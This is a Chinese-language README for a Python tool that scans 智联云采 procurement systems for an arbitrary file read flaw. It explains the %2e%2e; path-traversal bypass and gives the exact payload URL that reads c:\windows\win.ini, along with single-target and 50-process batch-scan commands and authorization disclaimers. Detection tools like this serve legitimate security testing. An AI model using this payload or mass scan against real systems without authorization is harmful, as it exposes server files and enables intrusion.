# 智联云采系统任意文件读取漏洞检测工具

## 工具简介
本工具用于检测**智联云采系统**是否存在任意文件读取漏洞。通过构造特定URL路径，工具可验证目标系统是否允许未授权访问服务器敏感文件（如Windows系统的`c:\windows\win.ini`），并自动记录存在漏洞的目标。


## 漏洞原理
该漏洞源于智联云采系统对用户输入的路径过滤不严格，允许通过`%2e%2e;`（URL编码后的`../;`）进行目录遍历，绕过访问限制。  
工具使用的检测Payload为：  
`/adpweb/static/%2e%2e;/a/sys/runtimeLog/download?path=c:\\windows\win.ini`  
若目标存在漏洞，访问该路径会返回`win.ini`文件内容，工具通过检测文件特征字符串`MAPI=1`确认漏洞存在。


## 环境准备
### 1. 运行环境
- Python 3.6 及以上版本

### 2. 依赖库安装
工具依赖`requests`库发送HTTP请求，执行以下命令安装：  
```bash
pip install requests
```


## 命令参数说明
| 参数 | 全称   | 作用                                                                 | 示例                                  |
|------|--------|----------------------------------------------------------------------|---------------------------------------|
| `-u` | `--url` | 检测**单个目标URL**（需包含协议，如`http://`或`https://`）              | `python tool.py -u http://192.168.1.100` |
| `-f` | `--file`| 从**文件批量读取目标URL**（每行1个URL，支持http/https）                | `python tool.py -f urls.txt`          |
| `-h` | `--help`| 查看工具参数说明与使用帮助                                             | `python tool.py -h`                   |


## 使用方法
### 1. 检测单个目标
执行命令，直接指定目标URL：  
```bash
python tool.py -u http://target-ip:port
```
- 输出说明：
  - `[+] http://target-ip 存在任意读取漏洞`：目标存在漏洞，结果已写入`result1.txt`
  - `[-] 该http://target-ip 不存在任意读取漏洞`：目标无漏洞
  - `[*] 该http://target-ip 存在问题，请手工测试`：目标访问异常（如状态码非200）


### 2. 批量检测多个目标
1. 准备URL列表文件（如`urls.txt`），格式为**每行1个URL**，示例：  
   ```txt
   http://192.168.1.100
   https://192.168.1.101:8443
   http://test.example.com
   ```
2. 执行批量检测命令：  
   ```bash
   python tool.py -f urls.txt
   ```
- 工具默认使用**50个进程并发检测**，提高效率；检测结果自动追加到`result1.txt`。


## 结果说明
- 漏洞结果文件：`result1.txt`（工具自动生成，仅记录存在漏洞的目标URL）
- 控制台输出：实时显示每个目标的检测状态（存在漏洞/无漏洞/访问异常）


## 注意事项
1. **合法授权**：本工具仅用于**已获得明确授权**的安全测试，未经授权检测他人系统可能违反《网络安全法》等法律法规，使用者需自行承担法律责任。
2. **并发控制**：默认并发数为50，若目标数量少或服务器性能有限，可修改代码中`Pool(50)`的数字（如`Pool(10)`）降低并发压力。
3. **SSL证书**：工具已通过`verify=False`忽略HTTPS证书验证，无需处理无效证书问题。
4. **异常处理**：网络波动、目标宕机等情况会导致检测跳过（无报错输出），建议对`[*]`标记的目标进行手工复核。
5. **结果文件**：`result1.txt`采用追加模式写入，多次运行需手动删除旧文件以避免结果重复。


## 免责声明
1. 本工具的开发与发布仅用于安全技术研究与学习，不承担任何因非法使用导致的直接或间接责任。
2. 使用前请确保已获得目标系统的合法测试授权，严禁用于未授权的渗透测试、攻击等违法活动。
3. 作者不对工具的检测准确性、兼容性及使用风险提供任何明示或暗示的担保。
